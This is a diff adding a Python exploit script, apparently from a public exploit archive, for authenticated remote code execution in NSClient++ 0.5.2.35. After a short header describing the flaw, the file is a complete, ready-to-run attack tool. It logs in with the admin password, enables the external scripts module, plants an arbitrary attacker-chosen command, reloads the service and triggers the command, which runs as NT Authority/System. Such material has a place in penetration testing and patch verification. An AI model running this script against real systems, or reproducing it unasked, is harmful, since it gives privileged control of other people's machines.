@@ -1,0 +1,192 @@
+# Exploit Title: NSClient++ 0.5.2.35 - Authenticated Remote Code Execution
+# Google Dork: N/A
+# Date: 2020-04-20
+# Exploit Author: kindredsec
+# Vendor Homepage: https://nsclient.org/
+# Software Link: https://nsclient.org/download/
+# Version: 0.5.2.35
+# Tested on: Microsoft Windows 10 Pro (x64)
+# CVE: N/A
+#
+# NSClient++ is a monitoring agent that has the option to run external scripts.
+# This feature can allow an attacker, given they have credentials, the ability to execute
+# arbitrary code via the NSClient++ web application. Since it runs as NT Authority/System bt
+# Default, this leads to privileged code execution.
+
+#!/usr/bin/env python3
+
+import requests
+from bs4 import BeautifulSoup as bs
+import urllib3
+import json
+import sys
+import random
+import string
+import time
+import argparse
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def generateName():
+
+	letters = string.ascii_lowercase + string.ascii_uppercase
+	return ''.join(random.choice(letters) for i in range(random.randint(8,13)))
+
+def printStatus(message, msg_type):
+
+	C_YELLOW = '\033[1;33m'
+	C_RESET = '\033[0m'
+	C_GREEN = '\033[1;32m'
+	C_RED = '\033[1;31m'
+
+	if msg_type == "good":
+		green_plus = C_GREEN + "[+]" + C_RESET 
+		string = green_plus + " " + message
+
+	elif msg_type == "info":
+		yellow_ex = C_YELLOW + "[!]" + C_RESET
+		string = yellow_ex + " " + message
+	
+	elif msg_type == "bad":
+		red_minus = C_RED + "[-]" + C_RESET
+		string = red_minus + " " + message
+
+	print(string)
+
+
+# This function adds a new external script containing the desired
+# command, then saves the configuration
+def configurePayload(session, cmd, key):
+
+	printStatus("Configuring Script with Specified Payload . . .", "info")
+	endpoint = "/settings/query.json"
+	node = { "path" : "/settings/external scripts/scripts",
+		 "key" : key } 
+	value = { "string_data" :  cmd }
+	update = { "node" : node , "value" : value }
+	payload = [ { "plugin_id" : "1234",
+		    "update" :  update } ] 
+	json_data = { "type" : "SettingsRequestMessage", "payload" : payload }
+
+	out = session.post(url = base_url + endpoint, json=json_data, verify=False)
+	if "STATUS_OK" not in str(out.content):
+		printStatus("Error configuring payload. Hit error at: "  + endpoint, "bad")
+		sys.exit(1)
+
+	printStatus("Added External Script (name: " + key + ")", "good")
+	time.sleep(3)
+	printStatus("Saving Configuration . . .", "info")
+	header = { "version" : "1" }
+	payload = [ { "plugin_id" : "1234", "control" : { "command" : "SAVE" }} ]
+	json_data = { "header" : header, "type" : "SettingsRequestMessage", "payload" : payload }
+	
+	session.post(url = base_url + endpoint, json=json_data, verify=False)	
+
+
+# Since the application needs to be restarted after making changes,
+# this function reloads the application, and waits for it to come back.
+def reloadConfig(session):
+
+	printStatus("Reloading Application . . .", "info")
+	endpoint = "/core/reload"
+	session.get(url = base_url + endpoint, verify=False)
+	
+	# Wait until the application successfully reloads by making a request
+	# every 10 seconds until it responds.
+	printStatus("Waiting for Application to reload . . .", "info")
+	time.sleep(10)
+	response = False
+	count = 0 
+	while not response:
+		try:
+			out = session.get(url = base_url, verify=False, timeout=10)
+			if len(out.content) > 0:
+				response = True
+		except:
+			count += 1
+			if count > 10:
+				printStatus("Application failed to reload. Nice DoS exploit! /s", "bad")
+				sys.exit(1)
+			else:
+				continue	
+
+
+# This function makes the call to the new external script to
+# ultimately execute the code.
+def triggerPayload(session, key):
+
+	printStatus("Triggering payload, should execute shortly . . .", "info")
+	endpoint = "/query/" + key
+	try:
+		session.get(url = base_url + endpoint, verify=False, timeout=10)
+	except requests.exceptions.ReadTimeout:
+		printStatus("Timeout exceeded. Assuming your payload executed . . .", "info")
+		sys.exit(0)
+
+
+# Before setting up the exploit, this function makes sure the
+# required feature (External Scripts) is enabled on the application.
+def enableFeature(session):
+
+	printStatus("Enabling External Scripts Module . . .", "info")
+	endpoint = "/registry/control/module/load"
+	params = { "name" : "CheckExternalScripts" }
+	out = session.get(url = base_url + endpoint, params=params, verify=False)
+	if "STATUS_OK" not in str(out.content):
+		printStatus("Error enabling required feature. Hit error at: "  + endpoint, "bad")
+		sys.exit(1)
+
+
+# This function obtains an authentication token that gets added to all
+# remaining headers.
+def getAuthToken(session):
+
+	printStatus("Obtaining Authentication Token . . .", "info")
+	endpoint = "/auth/token"
+	params = { "password" : password }
+	auth = session.get(url = base_url + endpoint, params=params, verify=False)	
+	if "auth token" in str(auth.content):
+		j = json.loads(auth.content)
+		authToken = j["auth token"]
+		printStatus("Got auth token: " + authToken, "good")
+		return authToken
+	else:
+		printStatus("Error obtaining auth token, is your password correct? Hit error at: "  + endpoint, "bad")
+		sys.exit(1)
+		
+
+
+parser = argparse.ArgumentParser("NSClient++ 0.5.2.35 Authenticated RCE")
+parser.add_argument('-t', nargs='?', metavar='target', help='Target IP Address.')
+parser.add_argument('-P', nargs='?', metavar='port', help='Target Port.')
+parser.add_argument('-p', nargs='?', metavar='password', help='NSClient++ Administrative Password.')
+parser.add_argument('-c', nargs='?', metavar='command', help='Command to execute on target')
+args = parser.parse_args()
+
+if len(sys.argv) < 4:
+	parser.print_help()
+	sys.exit(1)
+
+# Build base URL, grab needed arguments
+base_url = "https://" + args.t + ":" + args.P
+printStatus("Targeting base URL " + base_url, "info")
+password = args.p
+cmd = args.c
+
+# Get first auth token, and add it to headers of session
+s = requests.session()
+token = getAuthToken(s)
+s.headers.update({ "TOKEN" : token})
+
+# Generate a random name, enable the feature, add the payload,
+# then reload.
+randKey = generateName()
+enableFeature(s)
+configurePayload(s, cmd, randKey)
+reloadConfig(s)
+
+# Since application was reloaded, need a new auth token.
+token = getAuthToken(s)
+s.headers.update({ "TOKEN" : token})
+
+# Execute our code.
+triggerPayload(s, randKey)
